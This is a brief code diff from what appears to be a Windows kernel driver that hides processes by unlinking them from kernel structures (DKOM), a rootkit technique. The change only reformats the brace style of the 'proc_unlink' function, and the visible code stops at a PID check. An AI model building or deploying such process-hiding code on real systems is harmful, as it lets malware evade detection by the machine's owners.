@@ -10,8 +10,7 @@
 #include "dkom.h"
 #include "ioctl.h"
 
-NTSTATUS proc_unlink(UINT32 pid)
-{
+NTSTATUS proc_unlink(UINT32 pid) {
         if (!pid) {
                 DbgPrint(DRIVER_PREFIX "invalid PID for Hide: %d", pid);
                 return STATUS_SUCCESS;
